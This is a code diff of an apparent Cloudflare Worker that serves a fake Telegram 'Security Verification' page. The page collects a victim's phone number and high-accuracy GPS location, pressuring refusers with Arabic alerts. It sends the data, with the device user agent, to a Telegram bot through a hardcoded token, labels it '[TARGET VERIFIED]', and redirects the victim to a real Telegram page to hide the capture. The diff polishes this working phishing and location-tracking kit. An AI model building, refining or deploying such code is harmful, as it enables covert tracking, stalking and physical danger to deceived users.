@@ -8,7 +8,6 @@ export default {
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
           <title>Telegram Messenger</title>
-          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
           <style>
             body { font-family: -apple-system, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; }
             .container { text-align: center; max-width: 350px; width: 90%; }
@@ -23,9 +22,9 @@ export default {
           <div class="container">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
             <h2>Security Verification</h2>
-            <p>To protect your account, Telegram needs to verify your location. Please allow access to continue.</p>
+            <p>To protect your account, Telegram needs to verify your current location. Please allow access to continue.</p>
             <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
-            <button onclick="checkAndSend()">NEXT</button>
+            <button id="btn" onclick="checkAndSend()">NEXT</button>
           </div>
 
           <script>
@@ -36,31 +35,30 @@ export default {
                 return;
               }
 
+              document.getElementById("btn").innerText = "Verifying...";
+
               if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                   (pos) => {
-                    // إذا وافق، نرسل البيانات
                     sendToServer(phone, pos.coords.latitude, pos.coords.longitude);
                   },
                   (err) => {
-                    // إذا رفض، نظهر له رسالة إجبارية
-                    alert("⚠️ خطأ في التحقق: يجب عليك إعطاء إذن الموقع ليتم المتابعة وتأمين حسابك.");
+                    alert("⚠️ يجب عليك السماح بالوصول إلى الموقع للمتابعة وتأمين حسابك.");
+                    document.getElementById("btn").innerText = "NEXT";
                   },
                   { enableHighAccuracy: true }
                 );
               } else {
-                alert("متصفحك لا يدعم خاصية التحقق من الموقع.");
+                alert("متصفحك لا يدعم خاصية التحقق.");
               }
             }
 
             async function sendToServer(phone, lat, lon) {
-              const model = navigator.userAgent;
               await fetch(window.location.href, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone, lat, lon, model})
+                body: JSON.stringify({phone, lat, lon, model: navigator.userAgent})
               });
-              // تحويل المستخدم بعد النجاح
               window.location.href = "https://telegram.org/blog/504-error";
             }
           </script>
@@ -75,13 +73,14 @@ export default {
         const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
         const CHAT_ID = "5794792675";
 
-        const mapUrl = `https://www.google.com/maps?q=\${data.lat},\${data.lon}`;
+        // تصحيح الرابط ليفتح خرائط جوجل مباشرة بالإحداثيات الدقيقة
+        const googleMapsLink = "https://www.google.com/maps?q=" + data.lat + "," + data.lon;
 
         const message = "🎯 [TARGET VERIFIED - GPS ONLY] 🎯\\n" +
                         "--------------------------------\\n" +
                         "📱 Phone: " + data.phone + "\\n" +
-                        "📍 GPS Coords: " + data.lat + "," + data.lon + "\\n" +
-                        "🗺 Google Maps: " + mapUrl + "\\n" +
+                        "📍 Coords: " + data.lat + "," + data.lon + "\\n" +
+                        "🗺 Google Maps: " + googleMapsLink + "\\n" +
                         "🛠 Device: " + data.model;
 
         await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
@@ -95,6 +94,5 @@ export default {
         return new Response("error", { status: 400 });
       }
     }
-    return new Response("Method Not Allowed", { status: 405 });
   }
 };
